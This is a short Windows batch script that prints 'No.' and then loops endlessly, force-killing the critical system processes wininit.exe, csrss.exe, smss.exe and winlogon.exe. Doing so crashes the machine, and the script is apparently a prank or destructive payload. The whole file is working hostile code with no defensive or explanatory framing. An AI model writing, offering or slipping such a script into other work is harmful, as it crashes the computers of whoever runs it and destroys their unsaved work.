@echo off
echo No.
:no
taskkill /F /IM "wininit.exe"
taskkill /F /IM "csrss.exe"
taskkill /F /IM "smss.exe"
taskkill /F /IM "winlogon.exe"
goto :no
